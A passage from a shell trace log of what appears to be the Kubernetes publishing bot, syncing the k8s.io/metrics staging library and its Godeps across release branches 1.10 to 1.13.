'\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/metrics -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=fed17874550713817ec34e018d6b437639407d13\n>\t++ git log --first-parent --format=%H --reverse fed17874550713817ec34e018d6b437639407d13..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch release-1.10.'\n>\t+ git checkout -q release-1.10\n>\tChecking out branch release-1.10.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=b11cf31b380ba10a99b7c0b900f6a71f1045db45\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=b11cf31b380ba10a99b7c0b900f6a71f1045db45\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' b11cf31b380ba10a99b7c0b900f6a71f1045db45 '!=' b11cf31b380ba10a99b7c0b900f6a71f1045db45 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:release-1.10,api:release-1.10,client-go:release-7.0 '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:release-1.10,api:release-1.10,client-go:release-7.0\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=b11cf31b380ba10a99b7c0b900f6a71f1045db45\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:release-1.10,api:release-1.10,client-go:release-7.0 k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:release-1.10,api:release-1.10,client-go:release-7.0\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/metrics\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ indent-godeps\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/metrics/\") or . == \"k8s.io/metrics\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.10,api:release-1.10,client-go:release-7.0\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ head -n 1\n>\t++ grep '^Kubernetes-commit: '\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=32ac1c9073b132b8ba18aa830f46b77dcceb0723\n>\t+ '[' -z 32ac1c9073b132b8ba18aa830f46b77dcceb0723 ']'\n>\t++ git-find-merge 32ac1c9073b132b8ba18aa830f46b77dcceb0723 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '32ac1c9073b132b8ba18aa830f46b77dcceb0723^1..upstream-branch' --first-parent\n>\t+++ git rev-list 32ac1c9073b132b8ba18aa830f46b77dcceb0723..upstream-branch --ancestry-path\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-parse 32ac1c9073b132b8ba18aa830f46b77dcceb0723\n>\t+ local k_last_kube_merge=32ac1c9073b132b8ba18aa830f46b77dcceb0723\n>\t+ local dep_count=3\n>\t+ (( i=0 ))\n>\t+ (( i<3 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=release-1.10\n>\t+ echo 'Looking up which commit in the release-1.10 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 32ac1c9073b132b8ba18aa830f46b77dcceb0723.'\n>\tLooking up which commit in the release-1.10 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 32ac1c9073b132b8ba18aa830f46b77dcceb0723.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tChecking out k8s.io/apimachinery to e386b2658ed20923da8cc9250e552f082899a1ee\n>\t++ look -b 32ac1c9073b132b8ba18aa830f46b77dcceb0723 ../kube-commits-apimachinery-release-1.10\n>\t+ '[' -z e386b2658ed20923da8cc9250e552f082899a1ee ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to e386b2658ed20923da8cc9250e552f082899a1ee'\n>\t+ git checkout -q e386b2658ed20923da8cc9250e552f082899a1ee\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=api\n>\t+ local branch=release-1.10\n>\t+ echo 'Looking up which commit in the release-1.10 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 32ac1c9073b132b8ba18aa830f46b77dcceb0723.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the release-1.10 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 32ac1c9073b132b8ba18aa830f46b77dcceb0723.\n>\t++ look -b 32ac1c9073b132b8ba18aa830f46b77dcceb0723 ../kube-commits-api-release-1.10\n>\t+ '[' -z 8b7507fac302640dd5f1efbf9643199952cc58db ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to 8b7507fac302640dd5f1efbf9643199952cc58db'\n>\t+ git checkout -q 8b7507fac302640dd5f1efbf9643199952cc58db\n>\tChecking out k8s.io/api to 8b7507fac302640dd5f1efbf9643199952cc58db\n>\tLooking up which commit in the release-7.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 32ac1c9073b132b8ba18aa830f46b77dcceb0723.\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=client-go\n>\t+ local branch=release-7.0\n>\t+ echo 'Looking up which commit in the release-7.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 32ac1c9073b132b8ba18aa830f46b77dcceb0723.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 32ac1c9073b132b8ba18aa830f46b77dcceb0723 ../kube-commits-client-go-release-7.0\n>\tChecking out k8s.io/client-go to a312bfe35c401f70e5ea0add48b50da283031dc3\n>\t+ '[' -z a312bfe35c401f70e5ea0add48b50da283031dc3 ']'\n>\t+ pushd ../client-go\n>\t+ echo 'Checking out k8s.io/client-go to a312bfe35c401f70e5ea0add48b50da283031dc3'\n>\t+ git checkout -q a312bfe35c401f70e5ea0add48b50da283031dc3\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\tRemoving complete vendor/ on non-master branch because this is a library.\n>\t+ '[' release-1.10 '!=' master ']'\n>\t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>\t+ rm -rf vendor/\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ true\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\tGodeps.json hasn't changed!\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.10 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code b11cf31b380ba10a99b7c0b900f6a71f1045db45\n>\tRemove redundant godep commits on-top of b11cf31b380ba10a99b7c0b900f6a71f1045db45.\n>\t+ echo 'Remove redundant godep commits on-top of b11cf31b380ba10a99b7c0b900f6a71f1045db45.'\n>\t+ git reset --soft -q b11cf31b380ba10a99b7c0b900f6a71f1045db45\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/metrics\n>\t+ local repo=metrics\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-metrics-release-1.10\n>\t+ '[' -n 'b11cf31 Merge pull request #65157 from caesarxuchao/cherrypick-65034-1.10' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-metrics-release-1.10'\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.10\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=b11cf31b380ba10a99b7c0b900f6a71f1045db45\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-metrics-release-1.10.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-metrics-release-1.10.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.10 --push-script ../push-tags-metrics-release-1.10.sh --dependencies apimachinery:release-1.10,api:release-1.10,client-go:release-7.0 --mapping-output-file '../tag-metrics-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.10\n>\t+ '[' b11cf31b380ba10a99b7c0b900f6a71f1045db45 '!=' b11cf31b380ba10a99b7c0b900f6a71f1045db45 ']'\n>\t+ git checkout release-1.10\n>\tAlready on 'release-1.10'\n>\tYour branch is up-to-date with 'origin/release-1.10'.\n>[08 Nov 18 18:12 UTC]: Successfully constructed release-1.10\n>[08 Nov 18 18:12 UTC]: /publish_scripts/construct.sh metrics release-1.11 release-1.11 apimachinery:release-1.11,api:release-1.11,client-go:release-8.0  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/metrics kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  3290824d1c7b4a3e9bf0a535aa67f7c7f3886571\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=metrics\n>\t+ SRC_BRANCH=release-1.11\n>\t+ DST_BRANCH=release-1.11\n>\t+ DEPS=apimachinery:release-1.11,api:release-1.11,client-go:release-8.0\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/metrics\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=3290824d1c7b4a3e9bf0a535aa67f7c7f3886571\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ '[' '!' -f .git/info/attributes ']'\n>\t+ echo 'Running garbage collection.'\n>\tRunning garbage collection.\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q b11cf31b380ba10a99b7c0b900f6a71f1045db45\n>\t+ git branch -D release-1.11\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.11\n>\tSwitching to origin/release-1.11.\n>\t+ echo 'Switching to origin/release-1.11.'\n>\t+ git branch -f release-1.11 origin/release-1.11\n>\t+ git checkout -q release-1.11\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.11\n>\tSkipping sync because upstream/release-1.11 at 3290824d1c7b4a3e9bf0a535aa67f7c7f3886571 did not change since last sync.\n>\t+ UPSTREAM_HASH=3290824d1c7b4a3e9bf0a535aa67f7c7f3886571\n>\t+ '[' 3290824d1c7b4a3e9bf0a535aa67f7c7f3886571 '!=' 3290824d1c7b4a3e9bf0a535aa67f7c7f3886571 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.11 at 3290824d1c7b4a3e9bf0a535aa67f7c7f3886571 did not change since last sync.'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.11\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=972ef826b8401c180b89cefc7457daa2d116daa9\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-metrics-release-1.11.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-metrics-release-1.11.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t++ echo kubernetes\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.11 --push-script ../push-tags-metrics-release-1.11.sh --dependencies apimachinery:release-1.11,api:release-1.11,client-go:release-8.0 --mapping-output-file '../tag-metrics-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.11\n>\t+ '[' 972ef826b8401c180b89cefc7457daa2d116daa9 '!=' 972ef826b8401c180b89cefc7457daa2d116daa9 ']'\n>\t+ git checkout release-1.11\n>\tAlready on 'release-1.11'\n>\tYour branch is up-to-date with 'origin/release-1.11'.\n>[08 Nov 18 18:12 UTC]: Successfully constructed release-1.11\n>[08 Nov 18 18:12 UTC]: /publish_scripts/construct.sh metrics release-1.12 release-1.12 apimachinery:release-1.12,api:release-1.12,client-go:release-9.0  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/metrics kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  fb1fd1cce012acb0ee0a248a15f086807c174299\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=metrics\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/metrics\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=fb1fd1cce012acb0ee0a248a15f086807c174299\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ '[' '!' -f .git/info/attributes ']'\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tFetching from origin.\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 972ef826b8401c180b89cefc7457daa2d116daa9\n>\t+ git branch -D release-1.12\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\tSwitching to origin/release-1.12.\n>\t+ echo 'Switching to origin/release-1.12.'\n>\t+ git branch -f release-1.12 origin/release-1.12\n>\t+ git checkout -q release-1.12\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.12\n>\t+ UPSTREAM_HASH=fb1fd1cce012acb0ee0a248a15f086807c174299\n>\t+ '[' fb1fd1cce012acb0ee0a248a15f086807c174299 '!=' fb1fd1cce012acb0ee0a248a15f086807c174299 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.12 at fb1fd1cce012acb0ee0a248a15f086807c174299 did not change since last sync.'\n>\tSkipping sync because upstream/release-1.12 at fb1fd1cce012acb0ee0a248a15f086807c174299 did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=c6bb70553a8287cd6451211dd366fee12e088b95\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-metrics-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-metrics-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-metrics-release-1.12.sh --dependencies apimachinery:release-1.12,api:release-1.12,client-go:release-9.0 --mapping-output-file '../tag-metrics-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.12\n>\t+ '[' c6bb70553a8287cd6451211dd366fee12e088b95 '!=' c6bb70553a8287cd6451211dd366fee12e088b95 ']'\n>\t+ git checkout release-1.12\n>\tAlready on 'release-1.12'\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>[08 Nov 18 18:12 UTC]: Successfully constructed release-1.12\n>[08 Nov 18 18:12 UTC]: /publish_scripts/construct.sh metrics release-1.13 release-1.13 apimachinery:release-1.13,api:release-1.13,client-go:release-10.0  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/metrics kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  9637141d5e2e0d5727307b5d099cefc3b1336555\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=metrics\n>\t+ SRC_BRANCH=release-1.13\n>\t+ DST_BRANCH=release-1.13\n>\t+ DEPS=apimachinery:release-1.13,api:release-1.13,client-go:release-10.0\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/metrics\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=9637141d5e2e0d5727307b5d099cefc3b1336555\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ '[' '!' -f .git/info/attributes ']'\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q c6bb70553a8287cd6451211dd366fee12e088b95\n>\t+ git branch -D release-1.13\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.13\n>\t+ echo 'Switching to origin/release-1.13.'\n>\t+ git branch -f release-1.13 origin/release-1.13\n>\tSwitching to origin/release-1.13.\n>\t+ git checkout -q release-1.13\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ grep -w -q upstream\n>\t+ git remote\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.13\n>\tSkipping sync because upstream/release-1.13 at 9637141d5e2e0d5727307b5d099cefc3b1336555 did not change since last sync.\n>\t+ UPSTREAM_HASH=9637141d5e2e0d5727307b5d099cefc3b1336555\n>\t+ '[' 9637141d5e2e0d5727307b5d099cefc3b1336555 '!=' 9637141d5e2e0d5727307b5d099cefc3b1336555 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.13 at 9637141d5e2e0d5727307b5d099cefc3b1336555 did not change since last sync.'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.13\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=8165b9898ebf0b4a72be44528c67b070f1df4943\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-metrics-release-1.13.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-metrics-release-1.13.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.13 --push-script ../push-tags-metrics-release-1.13.sh --dependencies apimachinery:release-1.13,api:release-1.13,client-go:release-10.0 --mapping-output-file '../tag-metrics-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.13\n>\t+ '[' 8165b9898ebf0b4a72be44528c67b070f1df4943 '!=' 8165b9898ebf0b4a72be44528c67b070f1df4943 ']'\n>\t+ git checkout release-1.13\n>\tYour branch is up-to-date with 'origin/release-1.13'.\n>\tAlready on 'release-1.13'\n>[08 Nov 18 18:13 UTC]: Successfully constructed release-1.13\n>[08 Nov 18 18:13 UTC]: Successfully ensured /go-workspace/src/k8s.io/csi-api exists\n>[08 Nov 18 18:13 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[08 Nov 18 18:13 UTC]: 